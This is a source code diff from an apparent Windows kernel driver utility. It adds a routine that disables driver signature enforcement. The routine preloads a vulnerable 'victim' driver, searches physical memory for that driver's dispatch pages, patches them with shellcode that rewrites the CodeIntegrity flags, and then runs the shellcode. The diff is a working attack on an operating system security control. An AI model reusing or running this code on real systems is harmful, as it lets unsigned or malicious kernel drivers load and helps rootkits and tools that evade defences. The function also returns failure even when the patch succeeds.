@@ -4,9 +4,9 @@
 *
 *  TITLE:       DSEFIX.CPP
 *
-*  VERSION:     1.27
+*  VERSION:     1.28
 *
-*  DATE:        25 Oct 2022
+*  DATE:        01 Dec 2022
 *
 *  CI DSE corruption related routines.
 *  Based on DSEFix v1.3
@@ -19,6 +19,13 @@
 *******************************************************************************/
 
 #include "global.h"
+
+#ifdef __cplusplus
+extern "C" {
+    void BaseShellDSEFix();
+    void BaseShellDSEFixEnd();
+}
+#endif
 
 ULONG KDUpCheckInstructionBlock(
     _In_ PBYTE Code,
@@ -407,6 +414,111 @@ ULONG_PTR KDUQueryCodeIntegrityVariableAddress(
     }
 
     return Result;
+}
+
+/*
+* KDUControlDSE2
+*
+* Purpose:
+*
+* Change Windows CodeIntegrity flags using memory brute-force.
+*
+*/
+BOOL KDUControlDSE2(
+    _In_ PKDU_CONTEXT Context,
+    _In_ ULONG DSEValue,
+    _In_ ULONG_PTR Address
+)
+{
+    BOOL bResult = FALSE;
+    BYTE shellBuffer[SHELLCODE_SMALL];
+    SIZE_T shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;
+
+    KDU_PROVIDER* prov;
+    KDU_VICTIM_PROVIDER* victimProv;
+    HANDLE victimDeviceHandle = NULL;
+
+    KDU_PHYSMEM_ENUM_PARAMS enumParams;
+
+    prov = Context->Provider;
+    victimProv = Context->Victim;
+
+    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
+    RtlCopyMemory(shellBuffer, BaseShellDSEFix, shellSize);
+
+    *(PULONG_PTR)&shellBuffer[0x2] = Address;
+    *(PULONG_PTR)&shellBuffer[0xC] = DSEValue;
+
+
+    if (shellSize > SHELLCODE_SMALL) {
+        supPrintfEvent(kduEventError,
+            "[!] Patch code size 0x%llX exceeds limit 0x%lX, abort\r\n", shellSize, SHELLCODE_SMALL);
+
+        return FALSE;
+    }
+
+    //
+    // Load/open victim.
+    //
+    if (VpCreate(victimProv,
+        Context->ModuleBase,
+        &victimDeviceHandle))
+    {
+        printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
+    }
+    else {
+
+        supPrintfEvent(kduEventError,
+            "[!] Error preloading victim driver, abort\r\n");
+
+        return FALSE;
+    }
+
+    printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
+        (PVOID)Address,
+        DSEValue);
+
+    enumParams.bWrite = TRUE;
+    enumParams.cbPagesFound = 0;
+    enumParams.cbPagesModified = 0;
+    enumParams.Context = Context;
+    enumParams.pvPayload = shellBuffer;
+    enumParams.cbPayload = (ULONG)shellSize;
+
+    supPrintfEvent(kduEventInformation,
+        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);
+
+    if (supEnumeratePhysicalMemory(KDUProcExpPagePatchCallback, &enumParams)) {
+
+        printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
+            enumParams.cbPagesFound,
+            enumParams.cbPagesModified);
+
+        //
+        // Run shellcode.
+        //
+        VpExecutePayload(victimProv, &victimDeviceHandle);
+
+        supPrintfEvent(kduEventInformation,
+            "[+] DSE patch executed successfully\r\n");
+    }
+
+    //
+    // Ensure victim handle is closed.
+    //
+    if (victimDeviceHandle) {
+        NtClose(victimDeviceHandle);
+        victimDeviceHandle = NULL;
+    }
+
+    //
+    // Cleanup.
+    //
+    if (VpRelease(victimProv, &victimDeviceHandle)) {
+        printf_s("[+] Victim released\r\n");
+    }
+
+    return bResult;
 }
 
 /*
